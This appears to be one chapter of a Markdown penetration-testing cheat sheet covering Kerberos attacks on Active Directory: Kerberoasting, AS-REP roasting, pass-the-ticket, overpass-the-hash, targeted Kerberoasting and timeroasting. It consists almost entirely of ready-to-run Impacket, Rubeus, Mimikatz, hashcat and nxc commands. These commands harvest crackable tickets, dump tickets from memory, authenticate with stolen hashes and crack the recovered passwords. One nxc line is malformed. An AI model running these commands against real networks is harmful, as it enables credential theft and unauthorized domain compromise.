# 03 — Kerberos Attacks: Kerberoasting, AS-REP, Pass-the-Ticket

[← Back to index](README.md)

## 3.1 Kerberoasting

Kerberoasting requests service tickets (TGS) for accounts with SPNs. The TGS is encrypted
with the service account's NTLM hash — attackable offline.

### From Linux — Impacket

```bash
# GetUserSPNs — enumerate and request TGS tickets
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile kerberoast.txt

# Using NTLM hash
impacket-GetUserSPNs $DOMAIN/$USER -hashes ':$HASH' -dc-ip $DC_IP -request

# Target specific user
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -usersfile users.txt

# Crack with hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES-256 tickets (if RC4 disabled)
hashcat -m 19700 kerberoast_aes.txt /usr/share/wordlists/rockyou.txt
```

### From Windows — Rubeus

```powershell
# Enumerate Kerberoastable accounts
.\Rubeus.exe kerberoast /stats

# Request TGS for all Kerberoastable accounts
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Request only RC4 tickets (easier to crack)
.\Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast.txt

# Target specific account
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt

# Using different credentials
.\Rubeus.exe kerberoast /domain:corp.local /dc:DC01 /creduser:$USER /credpassword:$PASS

# From PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash

# If user has no winrm access, then change with Invoke-RunasCs.ps1
Invoke-RunasCs -Username $USER -Password $PASS -Command "whoami"
```

## 3.2 AS-REP Roasting

AS-REP roasting targets accounts with the *"Do not require Kerberos preauthentication"*
flag set. No credentials needed — works anonymously.

### From Linux — Impacket

```bash
# Without credentials (anonymous)
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat

# With credentials (enumerate automatically)
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.txt
```

### From Windows — Rubeus

```powershell
# Enumerate and request AS-REP hashes
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Target specific user
.\Rubeus.exe asreproast /user:nopreauth_user /format:hashcat
```

```bash
# From Kali using kerbrute (just enumeration)
kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt
```

## 3.3 Pass-the-Ticket (PtT)

```powershell
# List current Kerberos tickets
klist
.\Rubeus.exe klist

# Export tickets from memory (requires local admin on Windows)
.\Rubeus.exe dump /nowrap
.\Rubeus.exe dump /service:cifs /nowrap
.\Mimikatz.exe 'sekurlsa::tickets /export' exit

# Import ticket (Windows)
.\Rubeus.exe ptt /ticket:ticket.kirbi
kerberos::ptt ticket.kirbi        # Mimikatz
```

```bash
# Pass ticket on Linux
export KRB5CCNAME=/tmp/stolen.ccache
python3 ticketConverter.py ticket.kirbi ticket.ccache   # Convert kirbi to ccache
impacket-smbclient -k -no-pass $DOMAIN/TARGET_HOST
```

```powershell
# Request TGT then import (over-pass-the-hash)
.\Rubeus.exe asktgt /user:$USER /ntlm:$HASH /ptt
.\Rubeus.exe asktgt /user:$USER /password:$PASS /ptt
```

## 3.4 Overpass-the-Hash (Pass-the-Key)

```powershell
# Use NTLM hash to request Kerberos TGT (Windows — Mimikatz)
.\Mimikatz.exe 'sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$HASH /run:cmd.exe' exit

# Rubeus overpass-the-hash
.\Rubeus.exe asktgt /user:$USER /ntlm:$HASH /ptt
.\Rubeus.exe asktgt /user:$USER /aes256:AES_KEY /opsec /ptt
```

```bash
# From Linux — request TGT using hash
impacket-getTGT $DOMAIN/$USER -hashes ':$HASH' -dc-ip $DC_IP
export KRB5CCNAME=USER.ccache

# Use AES key (less noisy)
impacket-getTGT $DOMAIN/$USER -aesKey AES256_KEY -dc-ip $DC_IP
```

## 3.5 Targeted Kerberoasting

```bash
# KRB_AP_ERR_SKEW(Clock skew too great)
timedatectl set-ntp off
sudo ntpdate $DC_IP

targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'

nxc ldap $DC_IP -u 'username' -p 'password --kerberoast - -k
```

## 3.6 Timeroasting 

```bash
nxc smb $DC_IP -M timeroast 
```

---

[← Prev: 02 — Enumeration](02-enumeration.md) | [Next: 04 — Password Attacks & Credential Abuse →](04-password-attacks-and-credential-abuse.md)
